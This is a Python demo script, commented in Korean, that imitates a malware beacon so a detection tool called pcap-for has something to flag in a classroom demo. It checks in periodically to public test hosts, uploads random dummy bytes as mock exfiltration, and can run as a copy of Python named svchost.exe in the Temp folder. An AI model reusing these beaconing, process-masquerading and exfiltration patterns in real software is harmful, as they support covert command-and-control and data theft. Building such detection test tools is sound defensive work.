"""시연용 가짜 비콘 (실제 악성코드 아님).

감염된 프로그램의 '네트워크 행동'만 흉내 낸다.
  - 일정 주기로 외부 서버에 접속 (C2 체크인 흉내)
  - N번째 접속 뒤 더미 데이터 업로드 (유출 흉내) — 무작위 바이트일 뿐, 파일·개인정보는 읽지 않는다
  - --duration 초가 지나면 스스로 종료

pcap-for 가 탐지하도록 '수상한 실행 위치'도 재현한다:
  install 은 현재 파이썬 실행 파일을 %TEMP%\\pcapfor_demo\\<이름> 으로 복사해 실행한다.
  (파이썬 표준 라이브러리는 PYTHONHOME 으로 원래 설치 위치를 가리킨다)

사용 (관리자 아닌 일반 PowerShell 에서도 됨):
  python demo\\fake_beacon.py install                       # Temp\\update.exe 로 30초 비콘 10분
  python demo\\fake_beacon.py install --name svchost.exe    # 시스템 프로세스 사칭까지 재현
  python demo\\fake_beacon.py install --mode plain          # 비표준 포트 4444 평문 (portquiz.net)
  python demo\\fake_beacon.py install --jitter 0.3          # 주기를 ±30% 흔들기 (평가 실험용)
  python demo\\fake_beacon.py run ...                       # 복사 없이 현재 파이썬으로 바로 실행
  python demo\\fake_beacon.py clean                         # 실행 중인 데모 종료 + 복사본 삭제

본인 PC 에서 수업 시연·실험 용도로만 사용하세요.
"""
from __future__ import annotations

import argparse
import os
import random
import shutil
import signal
import socket
import ssl
import subprocess
import sys
import time

DEMO_DIR = os.path.join(os.environ.get("TEMP", "/tmp"), "pcapfor_demo")
PID_FILE = os.path.join(DEMO_DIR, "beacon.pid")
UA = "pcapfor-demo-beacon/1.0 (harmless classroom simulation)"


def log(msg: str) -> None:
    print(f"[{time.strftime('%H:%M:%S')}] {msg}", flush=True)


# ------------------------------------------------------------------ 통신
_PINNED: dict[str, str] = {}


def _connect(host: str, port: int, tls: bool, timeout: float = 10.0):
    # 실제 악성코드처럼 시작 때 정한 IP 하나로만 접속한다 (DNS 로 IP 가 바뀌어 차단을 피하는 일 방지)
    ip = _PINNED.setdefault(host, socket.gethostbyname(host))
    s = socket.create_connection((ip, port), timeout=timeout)
    if tls:
        s = ssl.create_default_context().wrap_socket(s, server_hostname=host)
    return s


def _drain(s, limit: int = 65536, timeout: float = 5.0) -> int:
    s.settimeout(timeout)
    got = 0
    try:
        while got < limit:
            chunk = s.recv(4096)
            if not chunk:
                break
            got += len(chunk)
    except (socket.timeout, OSError):
        pass
    return got


def beacon(a) -> str:
    """체크인 1회: 매번 같은 크기의 요청을 보내고 짧은 응답을 받는다."""
    tls = a.mode == "https"
    with _connect(a.host, a.port, tls) as s:
        if tls:
            req = (f"GET {a.path} HTTP/1.1\r\nHost: {a.host}\r\nUser-Agent: {UA}\r\n"
                   f"X-Demo-Pad: {'A' * a.size}\r\nConnection: close\r\n\r\n").encode()
        else:
            req = b"PCAPFOR-DEMO-CHECKIN " + b"A" * a.size + b"\n"
        s.sendall(req)
        got = _drain(s, timeout=3.0)
    return f"체크인 → {a.host}:{a.port} (송신 {len(req)}B, 수신 {got}B)"


def upload(a) -> str:
    """유출 흉내: 무작위 더미 바이트를 올린다 (실제 파일 아님)."""
    total = a.upload_kb * 1024
    tls = a.mode == "https"
    sent = 0
    with _connect(a.host, a.port, tls, timeout=30) as s:
        if tls:
            head = (f"POST {a.upload_path} HTTP/1.1\r\nHost: {a.host}\r\nUser-Agent: {UA}\r\n"
                    f"Content-Type: application/octet-stream\r\nContent-Length: {total}\r\n"
                    f"Connection: close\r\n\r\n").encode()
            s.sendall(head)
        try:
            while sent < total:
                chunk = os.urandom(min(65536, total - sent))
                s.sendall(chunk)
                sent += len(chunk)
        except OSError as e:
            return f"업로드 중단 ({sent / 1024:.0f}KB 전송 후 서버가 끊음: {e})"
        _drain(s, timeout=5.0)
    return f"더미 업로드 {sent / 1024:.0f}KB → {a.host}:{a.port}"


def run(a) -> int:
    os.makedirs(DEMO_DIR, exist_ok=True)
    with open(PID_FILE, "w") as f:
        f.write(str(os.getpid()))
    log(f"가짜 비콘 시작 PID {os.getpid()} · 실행 파일 {sys.executable}")
    try:
        ip = _PINNED.setdefault(a.host, socket.gethostbyname(a.host))
    except OSError as e:
        log(f"대상 이름 확인 실패: {e}")
        return 1
    up = f"{a.upload_after}번째 체크인 뒤 {a.upload_kb}KB 더미 업로드" if a.upload_after else "업로드 없음"
    log(f"대상 {a.host} ({ip}):{a.port} {a.mode} · 주기 {a.interval}s ±{a.jitter:.0%} · "
        f"{a.duration:.0f}초 뒤 자동 종료 · {up}")
    end = time.time() + a.duration
    n = 0
    next_t = time.time()
    try:
        while time.time() < end:
            n += 1
            # 다음 체크인 시각을 '시작 시각' 기준으로 잡아 응답 대기 시간이 주기에 섞이지 않게 한다
            next_t += a.interval * (1 + random.uniform(-a.jitter, a.jitter))
            try:
                log(f"#{n} " + beacon(a))
            except OSError as e:
                log(f"#{n} 체크인 실패 (차단됐거나 네트워크 문제): {e}")
            if n == a.upload_after:
                try:
                    log(upload(a))
                except OSError as e:
                    log(f"업로드 실패 (차단됐거나 네트워크 문제): {e}")
            time.sleep(max(0.0, min(next_t - time.time(), end - time.time())))
    except KeyboardInterrupt:
        pass
    finally:
        try:
            os.remove(PID_FILE)
        except OSError:
            pass
    log(f"종료 (체크인 {n}회)")
    return 0


# ------------------------------------------------------------------ 설치/정리
def install(a, passthrough: list[str]) -> int:
    if sys.platform != "win32":
        print("install 은 Windows 전용입니다. 'run' 을 쓰세요.")
        return 1
    if os.path.exists(PID_FILE):
        print("이미 실행 중인 데모가 있습니다. 먼저 'clean' 하세요.")
        return 1
    os.makedirs(DEMO_DIR, exist_ok=True)
    home = sys.base_prefix
    exe = os.path.join(DEMO_DIR, a.name)
    shutil.copy2(os.path.join(home, "python.exe"), exe)
    for f in os.listdir(home):                          # python3XX.dll, vcruntime 등
        if f.lower().endswith(".dll"):
            shutil.copy2(os.path.join(home, f), os.path.join(DEMO_DIR, f))
    script = os.path.join(DEMO_DIR, "beacon_payload.py")
    shutil.copy2(os.path.abspath(__file__), script)
    env = dict(os.environ, PYTHONHOME=home, PYTHONDONTWRITEBYTECODE="1")
    env.pop("PYTHONPATH", None)
    p = subprocess.Popen([exe, script, "run", *passthrough], env=env, cwd=DEMO_DIR,
                         creationflags=getattr(subprocess, "CREATE_NEW_CONSOLE", 0))
    print(f"데모 실행: {exe} (PID {p.pid}) — 새 콘솔 창에서 로그가 보입니다.")
    print("pcap-for 감시 창에서 탐지를 확인하세요. 끝나면: python demo\\fake_beacon.py clean")
    return 0


def clean(_a) -> int:
    if os.path.exists(PID_FILE):
        try:
            pid = int(open(PID_FILE).read().strip())
            if sys.platform == "win32":
                subprocess.run(["taskkill", "/PID", str(pid), "/F"], capture_output=True)
            else:
                os.kill(pid, signal.SIGTERM)
            print(f"실행 중이던 데모 PID {pid} 종료")
        except (OSError, ValueError):
            pass
    for _ in range(10):                                  # 프로세스가 파일을 놓을 때까지 잠깐 대기
        try:
            shutil.rmtree(DEMO_DIR)
            break
        except FileNotFoundError:
            break
        except OSError:
            time.sleep(0.5)
    print(f"정리 완료: {DEMO_DIR} {'삭제됨' if not os.path.exists(DEMO_DIR) else '일부 남음 (수동 삭제)'}")
    return 0


def main(argv=None) -> int:
    p = argparse.ArgumentParser(description="pcap-for 시연용 가짜 비콘 (무해한 시뮬레이션)")
    sub = p.add_subparsers(dest="cmd", required=True)
    for name in ("install", "run"):
        q = sub.add_parser(name)
        if name == "install":
            q.add_argument("--name", default="update.exe", help="Temp 에 복사할 실행 파일 이름")
        q.add_argument("--mode", choices=("https", "plain"), default="https",
                       help="https: TLS 443 (기본) / plain: 비표준 포트 평문")
        q.add_argument("--host", default=None, help="대상 (기본 https=httpbin.org, plain=portquiz.net)")
        q.add_argument("--port", type=int, default=None, help="대상 포트 (기본 https=443, plain=4444)")
        q.add_argument("--path", default="/get")
        q.add_argument("--upload-path", default="/post")
        q.add_argument("--interval", type=float, default=30.0, help="체크인 주기(초)")
        q.add_argument("--jitter", type=float, default=0.0, help="주기 흔들림 비율 (0.3 = ±30%%)")
        q.add_argument("--size", type=int, default=200, help="체크인 패딩 크기(바이트)")
        q.add_argument("--duration", type=float, default=600.0, help="이 시간(초) 뒤 자동 종료")
        q.add_argument("--upload-after", type=int, default=8, help="몇 번째 체크인 뒤 업로드할지 (0=안 함)")
        q.add_argument("--upload-kb", type=int, default=1024, help="더미 업로드 크기(KB)")
    sub.add_parser("clean")
    a = p.parse_args(argv)
    if a.cmd == "clean":
        return clean(a)
    a.host = a.host or ("httpbin.org" if a.mode == "https" else "portquiz.net")
    a.port = a.port or (443 if a.mode == "https" else 4444)
    if a.cmd == "run":
        return run(a)
    passthrough = [x for x in (argv if argv is not None else sys.argv[1:])[1:]]
    i = 0
    while i < len(passthrough):                        # --name 은 run 에 넘기지 않는다
        if passthrough[i] == "--name":
            del passthrough[i:i + 2]
        elif passthrough[i].startswith("--name="):
            del passthrough[i]
        else:
            i += 1
    return install(a, passthrough)


if __name__ == "__main__":
    raise SystemExit(main())
